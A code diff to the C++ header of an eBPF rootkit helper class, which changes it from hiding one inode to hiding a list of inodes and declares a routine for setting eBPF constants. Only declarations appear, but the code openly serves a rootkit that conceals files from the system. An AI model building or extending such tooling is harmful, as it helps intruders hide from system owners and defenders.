@@ -4,6 +4,7 @@
 #include <cstdint>
 #include <string>
 #include <optional>
+#include <vector>
 #include "rootkit.skel.h"
 
 namespace rootkit {
@@ -12,7 +13,7 @@ class RootkitBpfHelper {
 private:
     struct rootkit_bpf * skel;
     struct ring_buffer * rb;
-    uint64_t inode_to_hide;
+    std::vector<uint64_t> inodes_to_hide;
     std::string error_msg;
 
 public:
@@ -22,7 +23,7 @@ public:
      * @param rb_callback Callback function that will be called every time ring
      * buffer receives data
      */
-    RootkitBpfHelper(const uint64_t inode_to_hide,
+    RootkitBpfHelper(std::vector<uint64_t> inodes_to_hide,
         int (* rb_callback)(void *, void *, unsigned long));
 
     /**
@@ -58,8 +59,7 @@ private:
      */
     void setup_arr_links();
 
-    /*
-     **
+    /**
      * @brief Setups ring buffer so data is ready to poll from it
      * @param map Ring buffer map
      * @param callback Function that will be called after data is received
@@ -68,6 +68,14 @@ private:
         struct bpf_map * map,
         int (*callback)(void *, void *, unsigned long)
     );
+
+    /**
+     * @brief Setups volatile constants in ebpf program. In case of an error, it
+     * puts it inside of an error_msg variable
+     * @return Returns true if bpf consts were set correctly,
+     * and false otherwise
+     */
+    bool setup_volatile_consts();
 };
 
 }
